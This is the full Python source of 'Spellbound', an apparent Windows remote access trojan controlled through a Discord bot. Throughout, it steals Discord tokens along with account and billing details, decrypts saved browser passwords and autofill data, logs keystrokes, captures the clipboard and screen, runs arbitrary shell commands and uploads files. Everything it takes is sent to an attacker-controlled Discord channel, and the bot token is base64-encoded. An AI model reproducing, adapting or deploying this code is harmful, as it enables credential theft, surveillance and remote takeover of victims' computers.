import os
import re
import sys
import uuid
import json
import time
import ctypes
import base64
import random
import string
import socket
import shutil
import sqlite3
import platform
import threading
import subprocess
import ctypes.wintypes

VERSION = "1.0"
PYTHON_CMD = sys.executable

class log:
    def error(text):
        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [ERROR] {text}")
    def info(text):
        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [INFO] {text}")

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
def InstallPackages(packages):
    for package in packages:
        log.info(f"Installing package {package}")
        subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

InstallPackages(packages=["requests", "pycryptodome", "pyperclip", "nextcord", "pynput", "pillow"])

import nextcord as discord
import requests
import pyperclip

from PIL import Image
from Crypto.Cipher import AES
from pynput.keyboard import Key, Listener

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
# ****** Discord ****** #
BOT_TOKEN = base64.b64decode("TVRJNU1qVXhPRE15TXpjeU16azJNRE0zTWcuRzNkSVBBLnJQUUxQSTRYVGhIUzVuZmxWN05BMXdSZE9rdjV4UXBNeDBFaldJ").decode('utf-8')  # %token%

# ****** Paths ****** #
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')
USER_HOME = f"C:\\Users\\{os.getlogin()}"
CONTAINER_FOLDER_PATH = f"C:\\Users\\{os.getlogin()}\\My Games"

blue = "[2;45m[0m[2;45m[0m[2;35m"
purple = "[2;34m"
reset = "[0m"


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
if not os.path.exists(CONTAINER_FOLDER_PATH):
    os.mkdir(CONTAINER_FOLDER_PATH)

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
discordTokens = []
discordUIDS = []
discordCommonPaths = {'Discord': ROAMING + '\\discord\\Local Storage\\leveldb\\','Discord Canary': ROAMING + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': ROAMING + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': ROAMING + '\\discordptb\\Local Storage\\leveldb\\','Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': LOCALAPPDATA + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': LOCALAPPDATA + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': LOCALAPPDATA + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': LOCALAPPDATA + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': LOCALAPPDATA + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': LOCALAPPDATA + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': LOCALAPPDATA + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': LOCALAPPDATA + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': LOCALAPPDATA + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': LOCALAPPDATA + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': LOCALAPPDATA + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': LOCALAPPDATA + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

browsersPasswords = []
browserAutofill = []
chromiumBrowsers = [{"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},{"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},{"name": "Opera", "path": os.path.join(ROAMING, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},{"name": "Opera GX", "path": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},{"name": "Yandex", "path": os.path.join(ROAMING, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
chromiumSubpaths = [{"name": "None", "path": ""},{"name": "Default", "path": "Default"},{"name": "Profile 1", "path": "Profile 1"},{"name": "Profile 2", "path": "Profile 2"},{"name": "Profile 3", "path": "Profile 3"},{"name": "Profile 4", "path": "Profile 4"},{"name": "Profile 5", "path": "Profile 5"},]

keyloggerStatut = False
keyloggerPressedKeys = []

cmdDirectory = ""

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================ UTILITY =============================================================================================================== #
def GetMACFormatedForDiscord():
    return f"{os.getlogin().lower()}-{'-'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])}"

def GetRandomString(length: int) -> str:
    return ''.join(random.choices(string.ascii_letters, k=length))

def SafeRemove(path):
    try:
        if os.path.exists(path):
            os.remove(path)
            log.info(f"Safe removed {path}")
    except Exception as e:
        log.error(f"An error occured while removing {path} :: {e}")

def KillProcess(processName):
    result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    if processName not in result.stdout:
        return
    subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    log.info(f"{processName} got terminated")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
def GetClipboard():
    if pyperclip.paste() != "":
        return f"Last item copied :\n```{pyperclip.paste()}```"
    else:
        return ":warning: Empty clipboard !"

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
def GetIdleTime():
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        return millis / 1000
    return 0

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [("biSize", ctypes.wintypes.DWORD),("biWidth", ctypes.wintypes.LONG),("biHeight", ctypes.wintypes.LONG),("biPlanes", ctypes.wintypes.WORD),("biBitCount", ctypes.wintypes.WORD),("biCompression", ctypes.wintypes.DWORD),("biSizeImage", ctypes.wintypes.DWORD),("biXPelsPerMeter", ctypes.wintypes.LONG),("biYPelsPerMeter", ctypes.wintypes.LONG),("biClrUsed", ctypes.wintypes.DWORD),("biClrImportant", ctypes.wintypes.DWORD),]

def Screenshot():
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    hdc_screen = user32.GetDC(0)
    hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
    hbm = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
    gdi32.SelectObject(hdc_mem, hbm)
    gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
    bmp_info = BITMAPINFOHEADER()
    bmp_info.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bmp_info.biWidth = screen_width
    bmp_info.biHeight = -screen_height
    bmp_info.biPlanes = 1
    bmp_info.biBitCount = 32
    bmp_info.biCompression = 0
    buffer_size = screen_width * screen_height * 4
    buffer = ctypes.create_string_buffer(buffer_size)
    gdi32.GetDIBits(hdc_screen, hbm, 0, screen_height, buffer, ctypes.byref(bmp_info), 0)
    gdi32.DeleteObject(hbm)
    gdi32.DeleteDC(hdc_mem)
    user32.ReleaseDC(0, hdc_screen)
    image = Image.frombuffer("RGB", (screen_width, screen_height), buffer, "raw", "BGRX", 0, 1)
    image.save(f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()} - Screenshot.png")

# ____________________________________________________________________________________________________________________________________________________ #
# ========================================================== DISCORD FUNCS =========================================================================== #
def ValidateToken(token: str) -> bool:
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
    if r.status_code == 200: 
        return True
    return False

def DecryptVal(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def GetMasterKey(path: str) -> str:
    if not os.path.exists(path):
        return None
    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return None

    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    pDataIn = DATA_BLOB(len(master_key), ctypes.cast(master_key, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()

    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
        decrypted_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
        ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
        return decrypted_key

def GetDiscordTokens():
    for name, path in discordCommonPaths.items():
        if not os.path.exists(path): continue
        _discord = name.replace(" ", "").lower()
        if "cord" in path:
            if not os.path.exists(ROAMING + f'\{_discord}\Local State'): continue
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(discordRegexpEnc, line):
                        token = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(ROAMING + f'\{_discord}\Local State'))

                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                discordTokens.append(token)
                                discordUIDS.append(uid)

        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(discordRegexp, line):
                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                discordTokens.append(token)
                                discordUIDS.append(uid)

def ExtractInfosFromToken():
    if not discordTokens:
        return

    final_to_return = []
    for token in discordTokens:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()

        username = user['username'] + '#' + user['discriminator']
        user_id = user['id']
        email = user['email']
        phone = user['phone']
        mfa = user['mfa_enabled']

        if user['premium_type'] == 0:
            nitro = 'None'
        elif user['premium_type'] == 1:
            nitro = 'Nitro Classic'
        elif user['premium_type'] == 2:
            nitro = 'Nitro'
        elif user['premium_type'] == 3:
            nitro = 'Nitro Basic'
        else:
            nitro = 'None'

        if billing:
            payment_methods = []
            for method in billing:
                if method['type'] == 1:
                    payment_methods.append('Credit Card')
                elif method['type'] == 2:
                    payment_methods.append('PayPal')
                else:
                    payment_methods.append('Unknown')
            payment_methods = ', '.join(payment_methods)
        else:
            payment_methods = None

        final_message = (f'\nUsername: {username} ({user_id})'
                         f'\nToken: {token}'
                         f'\nNitro: {nitro}'
                         f'\nBilling: {payment_methods if payment_methods != "" else "None"}'
                         f'\nMFA: {mfa}'
                         f'\nEmail: {email if email != None else "None"}'
                         f'\nPhone: {phone if phone != None else "None"}'
                         f'\n==============')
        final_to_return.append(final_message)

    return final_to_return

# _____________________________________________________________________________________________________________________________________________________ #
# ================================================================= CHROMIUM FUNCS ==================================================================== #
def DecryptData(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn),None,None,None,None,0,ctypes.byref(pDataOut)):
                decrypted_data = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                return decrypted_data.decode()

        except Exception as e:
            log.error(f"Failed to decrypt data: {e}")
            return f"Failed to decrypt data: {e}"

def ExtractPasswords():
    for browser in chromiumBrowsers:
        KillProcess(browser['taskname'])
        local_state_path = os.path.join(browser['path'], 'Local State')
        if not os.path.exists(local_state_path):
            continue

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        try:
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(key), ctypes.cast(key, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(
                ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)
            ):
                decryption_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
            else:
                raise ValueError("Failed to decrypt master key.")
        except Exception as e:
            print(f"Error decrypting master key :: {e}")
            continue

        for subpath in chromiumSubpaths:
            login_data_path = os.path.join(browser['path'], subpath['path'], 'Login Data')
            if not os.path.exists(login_data_path):
                continue

            try:
                temp_db = os.path.join(browser['path'], subpath['path'], f"{browser['name']}-pw.db")
                shutil.copy(login_data_path, temp_db)

                connection = sqlite3.connect(temp_db)
                cursor = connection.cursor()
                query_passwords = "SELECT origin_url, username_value, password_value FROM logins"
                cursor.execute(query_passwords)

                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    password = DecryptData(encrypted_password, decryption_key)

                    if username or password:
                        browsersPasswords.append(
                            {
                                "url": origin_url,
                                "username": username,
                                "password": password,
                            }
                        )

                cursor.close()
                connection.close()
                os.remove(temp_db)

            except Exception as e:
                log.error(f"Failed to extract password :: {e}")
                continue

def ExtractAutofill():
    for browser in chromiumBrowsers:
            KillProcess(browser["name"])
            browser_path = browser["path"]
            if not os.path.exists(browser_path):
                continue

            for profile in chromiumSubpaths:
                profile_path = os.path.join(browser_path, profile["path"])
                web_data_path = os.path.join(profile_path, "Web Data")

                if os.path.exists(web_data_path):
                    temp_copy = web_data_path + "_temp"
                    shutil.copy2(web_data_path, temp_copy)

                    try:
                        conn = sqlite3.connect(temp_copy)
                        cursor = conn.cursor()

                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                        tables = [table[0] for table in cursor.fetchall()]
                        if "autofill" in tables:
                            cursor.execute("SELECT name, value FROM autofill")
                            autofills = cursor.fetchall()

                            for autofill in autofills:
                                autofill_entry = (
                                    f'Name: {autofill[0]}\n'
                                    f'Value: {autofill[1]}\n'
                                    f"Browser: {browser['name']}\n"
                                    '==============\n'
                                )
                                browserAutofill.append(autofill_entry)

                        conn.close()
                    except sqlite3.Error as e:
                        pass
                    finally:
                        os.remove(temp_copy)


# ______________________________________________________________________________________________________________________________________________________ #
# ================================================================= KEYLOGGER FUNCS ==================================================================== #
def OnPress(key):
    global keyloggerPressedKeys, keyloggerStatut

    if not keyloggerStatut:
        return

    keyCodes = {
        Key.space: " ",
        Key.shift: "",
        Key.tab: " [TAB] ",
        Key.backspace: " [DEL] ",
        Key.esc: " [ESC] ",
        Key.caps_lock: " [CAPS LOCK] ",
        Key.enter: " [ENTER] ",
        Key.shift_r: ""
    }
    
    try:
        if key.char:
            keyloggerPressedKeys.append(key.char)
        else:
            keyloggerPressedKeys.append(keyCodes.get(key, f' [{key}] '))
    except AttributeError:
        keyloggerPressedKeys.append(keyCodes.get(key, f' [{key}] '))

def KeyloggerThread():
    with Listener(on_press=OnPress) as listen:
        listen.join()


# __________________________________________________________________________________________________________________________________________________ #
# =============================================================== DISCORD BOT ====================================================================== #
class Client(discord.Client):

    # _____________________________________________________________________________________________________________________________________________________ #
    # ============================================================== CHANNELS SETUP ======================================================================= #
    @staticmethod
    async def on_ready():
        log.info("Connection etablished with C2")
        for guild in client.guilds:
            # ****** Commands channel ****** #
            currentCommandSession = discord.utils.get(guild.text_channels, name=GetMACFormatedForDiscord())

            if currentCommandSession is None:
                newCommandChannel = await guild.create_text_channel(GetMACFormatedForDiscord())
                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{VERSION}`", color=discord.Color.blue())
                await newCommandChannel.send(embed=embed)
                log.info("New command channel created")
            else:
                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{VERSION}`", color=discord.Color.blue())
                await currentCommandSession.send(embed=embed)

            # ****** Other channel ****** #


        # ____________________________________________________________________________________________________________________________________________________ #
        # ================================================================= HACKS THREADS ==================================================================== #
        KEYLOGGER_THREAD = threading.Thread(target=KeyloggerThread)
        KEYLOGGER_THREAD.start()
        log.info("Keylogger thread started")


    # _________________________________________________________________________________________________________________________________________________ #
    # ===================================================================== COMMUNICATIONS ================================================================ #
    async def on_message(self, message):
        global keyloggerStatut, keyloggerPressedKeys, cmdDirectory

        if message.author == self.user:
            return
        
        channel = message.channel
        if channel.name == GetMACFormatedForDiscord():
            log.info(f"New message recieved : {message.content}")
            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .ping ================================================================== #
            if message.content == ".ping":
                await message.delete()
                
                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{VERSION}`", color=discord.Color.blue())
                await message.channel.send(embed=embed)

            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .help ================================================================== #
            elif message.content == ".help":
                await message.delete()

                embed = discord.Embed(description=f"**Help Menu :**\n- `.ping` : Show connected devices\n- `.clear` : Clear the current text channel\n- `.kill <process.exe>` : Kill process\n- `.clipboard` : Show copied elements\n- `.grab autofill` : Grab autofill field from web browser\n- `.grab discord` : Grab user's Discord informations\n- `.grab password` : Grab passwords from web browser\n- `.system` : Grab PC informations\n- `.screenshot` : Take a screenshot\n- `.start keylogger` : Start the keylogger\n- `.stop keylogger` : Stop the keylogger and send keys pressed\n- `.cd <path>` : Change  the working directory\n- `.shell <cmd>` : Execute cmd commands\n- `.download <path/to/file>` : Download a file from the computer\n- `.idle` : Show in secondes the afk time", color=discord.Color.blue())
                await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________ #
            # ====================================================================== .clear =============================================================== #
            elif message.content == ".cl" or message.content == ".clear":
                await message.channel.purge()

            # ____________________________________________________________________________________________________________________________________________ #
            # ================================================================== .kill =================================================================== #
            elif message.content.startswith(".kill"):
                await message.delete()

                command = message.content.split(" ")

                try:
                    KillProcess(command[1])
                    embed = discord.Embed(description=f":white_check_mark: Process `{command[1]}` terminated !", color=discord.Color.green())
                    await message.channel.send(embed=embed)
                except:
                    embed = discord.Embed(description=f":no_entry: Cannot terminate process `{command[1]}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)

            # _________________________________________________________________________________________________________________________________________________ #
            # ================================================================== .clipboard =================================================================== #
            elif message.content == ".cb" or message.content == ".clipboard":
                await message.delete()
                
                embed = discord.Embed(description=GetClipboard(), color=discord.Color.green())
                await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________________ #
            # ================================================================= .grab autofill ==================================================================== #
            elif message.content == ".grab autofill":
                await message.delete()
                
                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                embed_sent = await message.channel.send(embed=embed)

                ExtractAutofill()

                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                with open(filePath, "w") as f:
                    for autofill in browserAutofill:
                        f.write(autofill)

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Auto-fill.txt")
                await message.channel.send(file=fileEmbed)

                await embed_sent.delete()

                SafeRemove(filePath)

            # ____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .grab discord ================================================================== #
            elif message.content == ".grab discord":
                await message.delete()
                
                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                embed_sent = await message.channel.send(embed=embed)

                GetDiscordTokens()
                tokens = ExtractInfosFromToken()

                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                with open(filePath, "w") as f:
                    for token in tokens:
                        f.write(token)

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Discord Tokens.txt")
                await message.channel.send(file=fileEmbed)

                await embed_sent.delete()

                SafeRemove(filePath)

            # _____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .grab password ================================================================== #
            elif message.content == ".grab password" or message.content == ".grab passwords":
                await message.delete()
                
                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                embed_sent = await message.channel.send(embed=embed)

                ExtractPasswords()
                formatted = ""
                for entry in browsersPasswords:
                    formatted += (
                        f"URL:            {entry['url']}\n"
                        f"Username:       {entry['username']}\n"
                        f"Password:       {entry['password']}\n"
                        f"==============\n")

                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                with open(filePath, "w") as f:
                    f.write(formatted)

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Passwords.txt")
                await message.channel.send(file=fileEmbed)

                await embed_sent.delete()

                SafeRemove(filePath)

            # _______________________________________________________________________________________________________________________________________________ #
            # =================================================================== .system ================================================================== #
            elif message.content == ".system" or message.content == ".sys":
                await message.delete()
                
                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                embed_sent = await message.channel.send(embed=embed)

                requInfos = requests.get('https://ipinfo.io')
                data = requInfos.json()

                session = os.getlogin()
                computer_name = socket.gethostname()
                os_version = platform.system() + " " + platform.release()
                architecture = platform.machine()
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
                ip = data.get('ip')
                country = data.get('country')
                region = data.get('region')
                city = data.get('city')
                loc = data.get('loc')
                org = data.get('org')
                cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip().split('\n')[2]
                ram = subprocess.run(["powershell", "-Command", "Get-Process | Measure-Object -Property WorkingSet64 -Sum | ForEach-Object { \"{0:N2} MB\" -f ($_.Sum / 1MB) }"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip()

                embed = discord.Embed(description="", color=discord.Color.from_rgb(255, 255, 255))
                embed.add_field(name=":computer: **Global Info**", value=f"```ansi\n{blue}Computer@Username{reset} : {computer_name}@{session}\n{blue}Operative System{reset} : {os_version}\n{blue}Architecture{reset} : {architecture}\n{blue}Idle Time{reset} : {GetIdleTime()}s```", inline=True)
                embed.add_field(name=":floppy_disk: **Hardware**", value=f"```ansi\n{blue}RAM{reset} : {ram}\n{blue}CPU{reset} : {cpu}```", inline=True)
                embed.add_field(name=":satellite: **Network Info**", value=f"```ansi\n{blue}Public IP{reset} : {ip}\n{blue}MAC{reset} : {mac}\n{blue}Country{reset} : {country}\n{blue}Region{reset} : {region}\n{blue}City{reset} : {city}\n{blue}Localisation{reset} : {loc}\n{blue}Internet Provider{reset} : {org}```", inline=False)
                await message.channel.send(embed=embed)

                await embed_sent.delete()

            # __________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .screenshot ================================================================== #
            elif message.content == ".ss" or message.content == ".screenshot":
                await message.delete()

                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                embed_sent = await message.channel.send(embed=embed)
                
                Screenshot()

                fileEmbed = discord.File(f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()} - Screenshot.png", filename=f"{os.getlogin()} - Screenshot.png")
                await message.channel.send(file=fileEmbed)

                await embed_sent.delete()

                SafeRemove(f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()} - Screenshot.png")

            # _________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .keylogger ================================================================== #
            elif message.content == ".start keylogger":
                await message.delete()

                if keyloggerStatut:
                    embed = discord.Embed(description=f":no_entry: Keylogger already **ON** : use `.stop keylogger`", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return
                
                keyloggerStatut = True
                embed = discord.Embed(description=f":warning: Keylogger has started, now listening...", color=discord.Color.yellow())
                await message.channel.send(embed=embed)

            elif message.content == ".stop keylogger":
                await message.delete()

                if not keyloggerStatut:
                    embed = discord.Embed(description=f":no_entry: Keylogger already **OFF** : use `.start keylogger`", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return

                embed = discord.Embed(description=f":warning: Keylogger is stopped !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)
                keyloggerStatut = False

                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                embed_sent = await message.channel.send(embed=embed)
                
                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                finalMessage = ""
                for key in keyloggerPressedKeys:
                    finalMessage += key
                with open(filePath, "w") as f:
                    f.write(finalMessage)

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Keylogger Logs.txt")
                await message.channel.send(file=fileEmbed)

                await embed_sent.delete()

                SafeRemove(filePath)

            # __________________________________________________________________________________________________________________________________________ #
            # =================================================================== .cd ================================================================== #
            elif message.content.startswith(".cd"):
                await message.delete()

                command = message.content.split(" ")

                try:
                    os.chdir(command[1])
                    cmdDirectory = os.getcwd()
                    embed = discord.Embed(description=f"Current working directory changed to `{os.getcwd()}`", color=discord.Color.green())
                    await message.channel.send(embed=embed)
                except:
                    embed = discord.Embed(description=f":no_entry: Unkown directory : `{command[1]}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .shell ================================================================== #
            elif message.content.startswith(".shell") or message.content.startswith(".sh"):
                await message.delete()

                command = message.content.split(" ")

                try:
                    finalCommand = ["cmd", "/c"]
                    finalCommand.extend(command[1:])

                    result = subprocess.run(finalCommand, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850")
                    if result != "" or result != " ":
                        embed = discord.Embed(description=f"Command executed successfully :\n```{result.stdout.strip()}```", color=discord.Color.purple())
                    else:
                        embed = discord.Embed(description=f"Command executed successfully", color=discord.Color.purple())
                        
                    await message.channel.send(embed=embed)
                except Exception as e:
                    embed = discord.Embed(description=f":no_entry: Unexpected error : `{e}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)

            # ________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .download ================================================================== #
            elif message.content.startswith(".download"):
                await message.delete()

                command = message.content.split(" ")
                if not os.path.exists(command[1]):
                    embed = discord.Embed(description=":no_entry: Invalid file path", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return

                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                embed_sent = await message.channel.send(embed=embed)

                filePath = command[1]
                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - {os.path.basename(filePath)}")
                await message.channel.send(file=fileEmbed)

                await embed_sent.delete()

            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .idle ================================================================== #
            elif message.content == ".idle":
                await message.delete()

                embed = discord.Embed(description=f":stopwatch: Last input recorded `{GetIdleTime()}` seconds ago", color=discord.Color.green())
                await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== unkown command ================================================================== #
